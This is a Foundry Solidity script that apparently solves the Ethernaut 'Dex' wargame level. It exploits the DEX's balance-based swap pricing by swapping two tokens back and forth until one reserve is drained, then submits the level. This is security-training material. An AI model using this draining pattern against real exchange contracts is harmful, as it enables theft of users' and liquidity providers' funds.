// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import {Script, console2} from "forge-std/Script.sol";
import {EthernautHelper} from "../setup/EthernautHelper.sol";

// NOTE You can import your helper contracts & create interfaces here
interface Dex {
    function swap(address from, address to, uint amount) external;
    function getSwapPrice(address from, address to, uint amount) external view returns (uint);
    function approve(address spender, uint amount) external;
    function balanceOf(address token, address account) external view returns (uint);
    function token1() external view returns (address);
    function token2() external view returns (address);
}

contract DexSolution is Script, EthernautHelper {
    address constant LEVEL_ADDRESS = 0xB468f8e42AC0fAe675B56bc6FDa9C0563B61A52F;
    uint256 heroPrivateKey = vm.envUint("PRIVATE_KEY");
    address userAddress = vm.envAddress("ACCOUNT_ADDRESS");
    function run() public {
        vm.startBroadcast(heroPrivateKey);
        // NOTE this is the address of your challenge contract
        // NOTE make sure to change original function into "_createInstance()" for the correct challengeInstance address.
        address challengeInstance = _createInstance(LEVEL_ADDRESS);
        Dex dex = Dex(challengeInstance);
        address token1 = dex.token1();
        address token2 = dex.token2();
        // YOUR SOLUTION HERE
        dex.approve(challengeInstance, 1000000000000000000);

        dex.swap(token1, token2, dex.balanceOf(token1, userAddress));
        dex.swap(token2, token1, dex.balanceOf(token2, userAddress));

        dex.swap(token1, token2, dex.balanceOf(token1, userAddress));
        dex.swap(token2, token1, dex.balanceOf(token2, userAddress));

        dex.swap(token1, token2, dex.balanceOf(token1, userAddress));
        dex.swap(token2, token1, dex.balanceOf(token2, challengeInstance));

        // SUBMIT CHALLENGE. (DON'T EDIT)
        bool levelSuccess = submitInstance(challengeInstance);
        require(levelSuccess, "Challenge not passed yet");
        vm.stopBroadcast();

        console2.log(successMessage(22));
    }
}

